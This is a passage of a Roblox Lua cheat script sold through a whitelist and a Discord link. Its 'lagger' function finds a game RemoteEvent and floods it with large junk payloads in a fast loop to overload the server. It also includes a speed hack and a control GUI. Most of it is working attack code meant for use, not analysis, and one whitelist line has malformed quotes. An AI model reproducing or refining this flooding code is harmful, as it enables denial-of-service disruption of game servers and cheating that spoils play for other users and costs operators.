-- Whitelist System
local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- List of whitelisted usernames (case-insensitive)
local whitelistedUsers = {
 "gofrey_sab",
 "Neysemii",
 "frigotavcunpafdedans",
 "Jonathan22345668",
 "Yosta1230",
 "MitroBossXXX",
 "david_111t",
 "Amazingdaniel11dm",
 "brainot_sca3",
 "skibidibrohai",
 "trusted_0808",
 "AdoptRune84383",
 "lakakadu89",
 "ianissabot",
 "xzavegonhuhu",
 ‚ÄúShimpanzini347‚Äù
}

-- Convert player name to lowercase and check
local function isWhitelisted(username)
    local lowerName = string.lower(username)
    for _, whitelistedName in ipairs(whitelistedUsers) do
        if string.lower(whitelistedName) == lowerName then
            return true
        end
    end
    return false
end

if not isWhitelisted(player.Name) then
    player:Kick("You're not whitelisted. Please buy script at discord.gg/KD4DVpMB")
    return
end

-- Rest of the script continues below
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")

local playerGui = player:WaitForChild("PlayerGui")

local isLagging = false
local speedEnabled = false
local speedConn = nil
local uuid = "d80e2217-36b8-4bdc-9a46-2281c6f70b28"
local power = 200
local speedPower = 50
local SPEED_MULTIPLIER = 1.2

local target = nil
local fireLoop = nil

-- Notification function
local function showNotification(text, color)
    local notifGui = Instance.new("ScreenGui")
    notifGui.Name = "SpeedNotification_" .. tick()
    notifGui.Parent = playerGui
    notifGui.ResetOnSpawn = false
    notifGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    
    local notifFrame = Instance.new("Frame")
    notifFrame.Size = UDim2.new(0, 180, 0, 45)
    notifFrame.Position = UDim2.new(1, 200, 0.5, -22)
    notifFrame.BackgroundColor3 = color or Color3.fromRGB(30, 25, 50)
    notifFrame.BorderSizePixel = 0
    notifFrame.Parent = notifGui
    
    local notifCorner = Instance.new("UICorner")
    notifCorner.CornerRadius = UDim.new(0, 10)
    notifCorner.Parent = notifFrame
    
    local notifStroke = Instance.new("UIStroke")
    notifStroke.Color = Color3.fromRGB(100, 200, 100)
    notifStroke.Thickness = 2
    notifStroke.Parent = notifFrame
    
    local notifLabel = Instance.new("TextLabel")
    notifLabel.Size = UDim2.new(1, -20, 1, 0)
    notifLabel.Position = UDim2.new(0, 10, 0, 0)
    notifLabel.BackgroundTransparency = 1
    notifLabel.Text = text
    notifLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    notifLabel.TextSize = 14
    notifLabel.Font = Enum.Font.GothamBold
    notifLabel.TextXAlignment = Enum.TextXAlignment.Center
    notifLabel.Parent = notifFrame
    
    local slideIn = TweenService:Create(notifFrame, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
        Position = UDim2.new(1, -200, 0.5, -22)
    })
    slideIn:Play()
    
    task.delay(2, function()
        local slideOut = TweenService:Create(notifFrame, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
            Position = UDim2.new(1, 200, 0.5, -22)
        })
        slideOut:Play()
        slideOut.Completed:Connect(function()
            notifGui:Destroy()
        end)
    end)
end

-- Function to find any RemoteEvent
local function findTarget()
    local foundRemotes = {}
    local priorityTargets = {
        "WhyAreTheyTargetingMe!!",
        "FisherMan",
        "Chat",
        "AFK",
        "CookiesService"
    }
    
    local blacklistedNames = {
        "PlaceCooldownFromChat",
        "AdminPanelService",
        "AdminPanel",
        "IntegrityCheckProcessor",
        "LocalizationTableAnalyticsSender",
        "LocalizationService",
        "Analytics",
        "Telemetry",
        "Logger",
        "Reporter",
        "CanChatWith",
        "SetPlayerBlockList",
        "UpdatePlayerBlockList",
        "NewPlayerGroupDetails",
        "NewPlayerCanManageDetails",
        "SendPlayerBlockList",
        "UpdateLocalPlayerBlockList",
        "SendPlayerProfileSettings",
        "RequestPlayerProfileSettings",
        "UpdatePlayerProfileSettings",
        "ShowFriendJoinedPlayerToast",
        "ShowPlayerJoinedFriendsToast",
        "CreateOrJoinParty",
        "ServerSideBulkPurchaseEvent",
        "SetDialogInUse",
        "ContactListInvokeIrisInvite",
        "ContactListIrisInviteTeleport",
        "UpdateCurrentCall",
        "RequestDeviceCameraOrientationCapability",
        "ReceiveLikelySpeakingUsers",
        "ReferredPlayerJoin",
        "Update",
        "RE/Tools/Cooldown",
        "RE/FuseMachine/RevealNow",
        "RE/FuseMachine/FuseAnimation",
        "RE/NotificationService/Notify",
        "RE/PlotService/ClaimCoins",
        "RE/PlotService/Sell",
        "RE/PlotService/Open",
        "RE/PlotService/ToggleFriends",
        "RE/PlotService/CashCollected",
        "RE/ChatService/ChatMessage",
        "RE/SoundService/PlayClientSound",
        "RE/Snapshot/RealiableChannel",
        "RE/CommandsService/OpenCommandBar",
        "RE/92e5a494-0ab4-4c4e-ae6b-96e5f4a2a698",
        "92e5a494-0ab4-4c4e-ae6b-96e5f4a2a698",
        "6411a778-07a5-4513-b1c7-60b65ae05ac8",
        "RE/GameService/SpawnEffect",
        "RE/Leaderboard/ReplicateDisplayNames",
        "eb9dee81-7718-4020-b6b2-219888488d13",
        "fce51e06-a587-4ff0-9e19-869eb1859a01",
        "680db8c7-c46a-492c-b451-6e980910902c",
        "RE/StealService/Grab",
        "RE/PlotService/Place",
        "RE/StealService/StealingSuccess",
        "RE/StealService/StealingFailure",
        "RE/CombatService/ApplyImpulse",
        "RE/InventoryService/Sort",
        "RE/StockEventService/SetFocused",
        "RE/StockEventService/Return",
        "RE/StockEventService/Redeem",
        "RE/MerchantService/SetFocused",
        "RE/MerchantService/Animation",
        "RE/SantaMerchantService/SetFocused",
        "RE/SantaMerchantService/Animation",
        "RE/SantaMerchantService/CollectGoldElf",
        "RE/ShopService/Purchase",
        "RE/TutorialService/StartTutorial",
        "RE/TutorialService/FinishTutorial",
        "RE/TeleportService/Reconnect"
    }
    
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") then
            local fullName = v:GetFullName()
            local remoteName = v.Name
            
            local isBlacklisted = false
            for _, blacklisted in ipairs(blacklistedNames) do
                if string.find(fullName, blacklisted, 1, true) or string.find(remoteName, blacklisted, 1, true) then
                    isBlacklisted = true
                    break
                end
            end
            
            if not isBlacklisted then
                local isPriority = false
                for _, priority in ipairs(priorityTargets) do
                    if string.find(remoteName, priority, 1, true) then
                        isPriority = true
                        table.insert(foundRemotes, 1, v)
                        break
                    end
                end
                
                if not isPriority then
                    table.insert(foundRemotes, v)
                end
            end
        end
    end
    
    if #foundRemotes > 0 then
        return foundRemotes[1]
    end
    
    return nil
end

-- Speed Hack Functions
local function setSpeed(enable)
    if speedEnabled == enable then return end
    speedEnabled = enable
    
    if speedConn then
        speedConn:Disconnect()
        speedConn = nil
    end
    
    if speedEnabled then
        speedConn = RunService.Heartbeat:Connect(function()
            local char = player.Character
            if not char then return end
            
            local hum = char:FindFirstChildOfClass("Humanoid")
            local hrp = char:FindFirstChild("HumanoidRootPart")
            
            if not hum or not hrp then return end
            
            local moveDir = hum.MoveDirection
            if moveDir.Magnitude > 0 then
                hrp.AssemblyLinearVelocity = Vector3.new(
                    moveDir.X * speedPower,
                    hrp.AssemblyLinearVelocity.Y,
                    moveDir.Z * speedPower
                )
            end
        end)
        
        showNotification("‚ö° Speed ON", Color3.fromRGB(40, 80, 40))
    else
        showNotification("‚ö° Speed OFF", Color3.fromRGB(80, 40, 40))
    end
    
    updateUI()
end

-- Tween helper
local function tweenProp(obj, props, duration, style, direction)
    if not obj or not obj.Parent then return end
    local tween = TweenService:Create(obj, TweenInfo.new(
        duration or 0.3,
        style or Enum.EasingStyle.Quint,
        direction or Enum.EasingDirection.Out
    ), props)
    tween:Play()
    return tween
end

-- UI Variables
local powerLabel, targetLabel, statusLabel, speedStatusLabel, speedPowerLabel, sliderFill, speedSliderFill, lagButton, speedButton, speedInputBox

-- Safe UI update
function updateUI()
    pcall(function()
        if powerLabel and powerLabel.Parent then
            local percentage = math.floor((power / 200) * 100)
            local pkts = power * 1800
            powerLabel.Text = string.format("Power: %d%% (%d pkts)", percentage, pkts)
        end
        if speedPowerLabel and speedPowerLabel.Parent then
            speedPowerLabel.Text = string.format("Speed Power: %d", speedPower)
        end
        if speedInputBox and speedInputBox.Parent then
            if not speedInputBox:IsFocused() then
                speedInputBox.Text = tostring(speedPower)
            end
        end
        if targetLabel and targetLabel.Parent then
            if target and target.Parent then
                targetLabel.Text = "Target: " .. target.Name
                targetLabel.TextColor3 = Color3.fromRGB(100, 200, 255)
            else
                targetLabel.Text = "Target: None"
                targetLabel.TextColor3 = Color3.fromRGB(180, 100, 100)
            end
        end
        if statusLabel and statusLabel.Parent then
            if isLagging then
                statusLabel.Text = "üî¥ ACTIVE"
                statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
            else
                statusLabel.Text = "‚ö™ IDLE"
                statusLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
            end
        end
        if speedStatusLabel and speedStatusLabel.Parent then
            if speedEnabled then
                speedStatusLabel.Text = "Speed: üü¢ ON"
                speedStatusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
            else
                speedStatusLabel.Text = "Speed: üî¥ OFF"
                speedStatusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
            end
        end
        if speedButton and speedButton.Parent then
            if speedEnabled then
                speedButton.BackgroundColor3 = Color3.fromRGB(60, 100, 60)
                speedButton.Text = "üü¢ Speed ON"
            else
                speedButton.BackgroundColor3 = Color3.fromRGB(50, 40, 80)
                speedButton.Text = "‚ö° Enable Speed"
            end
        end
    end)
end

-- Update power
local function updatePower(newPower)
    power = math.clamp(math.floor(newPower or power), 1, 200)
    updateUI()
    
    if sliderFill and sliderFill.Parent then
        local percentage = (power - 1) / 199
        tweenProp(sliderFill, {Size = UDim2.new(percentage, 0, 1, 0)}, 0.2, Enum.EasingStyle.Sine)
    end
end

-- Update speed power
local function updateSpeedPower(newSpeed)
    speedPower = math.clamp(math.floor(newSpeed or speedPower), 1, 100)
    updateUI()
    
    if speedSliderFill and speedSliderFill.Parent then
        local percentage = (speedPower - 1) / 99
        tweenProp(speedSliderFill, {Size = UDim2.new(percentage, 0, 1, 0)}, 0.2, Enum.EasingStyle.Sine)
    end
end

-- Toggle lag function (FIXED VERSION)
local function toggleLag()
    isLagging = not isLagging
    
    if isLagging then
        if not target or not target.Parent then
            target = findTarget()
        end
        
        if not target then
            isLagging = false
            showNotification("‚ùå No Target Found", Color3.fromRGB(80, 40, 40))
            return
        end
        
        showNotification("üî• Lagger Started", Color3.fromRGB(80, 40, 40))
        
        fireLoop = task.spawn(function()
            while isLagging do
                if not target or not target.Parent then
                    target = findTarget()
                    
                    if not target then
                        isLagging = false
                        showNotification("‚ùå Target Lost", Color3.fromRGB(80, 40, 40))
                        break
                    end
                end
                
                -- Balanced payload size for good lag without rubber-banding
                local payloadSize = power * 150
                local payload = string.rep("X", payloadSize)
                
                -- Balanced fire count for effectiveness
                local fireCount = math.max(1, math.floor(power / 50))
                for i = 1, fireCount do
                    pcall(function()
                        target:FireServer(uuid, payload)
                    end)
                end
                
                -- Optimized wait time for balance
                task.wait(0.035)
            end
        end)
    else
        if fireLoop then
            task.cancel(fireLoop)
            fireLoop = nil
        end
        showNotification("üõë Lagger Stopped", Color3.fromRGB(40, 60, 80))
    end
    
    updateUI()
end

-- Wait for game to load
repeat task.wait() until game:IsLoaded()

task.wait(7)

target = findTarget()
updateUI()

-- Create GUI
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "CookieLagger_" .. tick()
screenGui.Parent = playerGui
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

-- Keyboard toggle
UserInputService.InputBegan:Connect(function(input, processed)
    if not processed and input.KeyCode == Enum.KeyCode.U then
        if screenGui then
            screenGui.Enabled = not screenGui.Enabled
        end
    elseif not processed and input.KeyCode == Enum.KeyCode.R then
        toggleLag()
    elseif not processed and input.KeyCode == Enum.KeyCode.Q then
        setSpeed(not speedEnabled)
    end
end)

-- Main Frame (smaller for mobile)
local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 300, 0, 350)
mainFrame.Position = UDim2.new(0.5, -150, 0.5, -175)
mainFrame.BackgroundColor3 = Color3.fromRGB(20, 15, 35)
mainFrame.BorderSizePixel = 0
mainFrame.Parent = screenGui
mainFrame.Active = true
mainFrame.ClipsDescendants = true

local mainCorner = Instance.new("UICorner")
mainCorner.CornerRadius = UDim.new(0, 12)
mainCorner.Parent = mainFrame

local mainStroke = Instance.new("UIStroke")
mainStroke.Color = Color3.fromRGB(80, 60, 140)
mainStroke.Thickness = 2
mainStroke.Parent = mainFrame

-- Header
local header = Instance.new("Frame")
header.Size = UDim2.new(1, 0, 0, 50)
header.BackgroundTransparency = 1
header.Parent = mainFrame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -50, 0, 25)
title.Position = UDim2.new(0, 12, 0, 6)
title.BackgroundTransparency = 1
title.Text = "Cookies Lagger"
title.TextColor3 = Color3.fromRGB(150, 130, 255)
title.TextSize = 16
title.Font = Enum.Font.GothamBold
title.TextXAlignment = Enum.TextXAlignment.Left
title.Parent = header

local subtitle = Instance.new("TextLabel")
subtitle.Size = UDim2.new(1, -50, 0, 14)
subtitle.Position = UDim2.new(0, 12, 0, 32)
subtitle.BackgroundTransparency = 1
subtitle.Text = "Made by Cookie"
subtitle.TextColor3 = Color3.fromRGB(120, 100, 180)
subtitle.TextSize = 10
subtitle.Font = Enum.Font.Gotham
subtitle.TextXAlignment = Enum.TextXAlignment.Left
subtitle.Parent = header

local closeBtn = Instance.new("TextButton")
closeBtn.Size = UDim2.new(0, 30, 0, 30)
closeBtn.Position = UDim2.new(1, -38, 0, 8)
closeBtn.BackgroundColor3 = Color3.fromRGB(200, 60, 100)
closeBtn.Text = "X"
closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
closeBtn.TextSize = 16
closeBtn.Font = Enum.Font.GothamBold
closeBtn.Parent = header

local closeBtnCorner = Instance.new("UICorner")
closeBtnCorner.CornerRadius = UDim.new(1, 0)
closeBtnCorner.Parent = closeBtn

closeBtn.MouseButton1Click:Connect(function()
    if isLagging then
        isLagging = false
        if fireLoop then task.cancel(fireLoop) end
    end
    if speedEnabled then
        setSpeed(false)
    end
    screenGui:Destroy()
end)

-- Content Frame
local contentFrame = Instance.new("Frame")
contentFrame.Size = UDim2.new(1, -24, 1, -70)
contentFrame.Position = UDim2.new(0, 12, 0, 60)
contentFrame.BackgroundTransparency = 1
contentFrame.Parent = mainFrame

-- Power Slider Section
local powerSection = Instance.new("Frame")
powerSection.Size = UDim2.new(1, 0, 0, 80)
powerSection.BackgroundColor3 = Color3.fromRGB(30, 25, 50)
powerSection.BorderSizePixel = 0
powerSection.Parent = contentFrame

local powerSectionCorner = Instance.new("UICorner")
powerSectionCorner.CornerRadius = UDim.new(0, 8)
powerSectionCorner.Parent = powerSection

local powerSectionStroke = Instance.new("UIStroke")
powerSectionStroke.Color = Color3.fromRGB(50, 40, 80)
powerSectionStroke.Thickness = 1
powerSectionStroke.Parent = powerSection

powerLabel = Instance.new("TextLabel")
powerLabel.Size = UDim2.new(1, -20, 0, 18)
powerLabel.Position = UDim2.new(0, 10, 0, 8)
powerLabel.BackgroundTransparency = 1
powerLabel.Text = "Power: 20% (1200 pkts)"
powerLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
powerLabel.TextSize = 11
powerLabel.Font = Enum.Font.GothamBold
powerLabel.TextXAlignment = Enum.TextXAlignment.Left
powerLabel.Parent = powerSection

targetLabel = Instance.new("TextLabel")
targetLabel.Size = UDim2.new(0.5, -20, 0, 16)
targetLabel.Position = UDim2.new(0, 10, 0, 24)
targetLabel.BackgroundTransparency = 1
targetLabel.Text = "Target: Searching..."
targetLabel.TextColor3 = Color3.fromRGB(180, 100, 100)
targetLabel.TextSize = 9
targetLabel.Font = Enum.Font.Gotham
targetLabel.TextXAlignment = Enum.TextXAlignment.Left
targetLabel.Parent = powerSection

statusLabel = Instance.new("TextLabel")
statusLabel.Size = UDim2.new(0.25, 0, 0, 16)
statusLabel.Position = UDim2.new(0.5, 0, 0, 24)
statusLabel.BackgroundTransparency = 1
statusLabel.Text = "‚ö™ IDLE"
statusLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
statusLabel.TextSize = 9
statusLabel.Font = Enum.Font.GothamBold
statusLabel.TextXAlignment = Enum.TextXAlignment.Center
statusLabel.Parent = powerSection

speedStatusLabel = Instance.new("TextLabel")
speedStatusLabel.Size = UDim2.new(0.25, 0, 0, 16)
speedStatusLabel.Position = UDim2.new(0.75, 0, 0, 24)
speedStatusLabel.BackgroundTransparency = 1
speedStatusLabel.Text = "Speed: üî¥ OFF"
speedStatusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
speedStatusLabel.TextSize = 8
speedStatusLabel.Font = Enum.Font.GothamBold
speedStatusLabel.TextXAlignment = Enum.TextXAlignment.Right
speedStatusLabel.Parent = powerSection

local sliderBg = Instance.new("Frame")
sliderBg.Size = UDim2.new(1, -20, 0, 8)
sliderBg.Position = UDim2.new(0, 10, 0, 46)
sliderBg.BackgroundColor3 = Color3.fromRGB(15, 10, 30)
sliderBg.BorderSizePixel = 0
sliderBg.Parent = powerSe
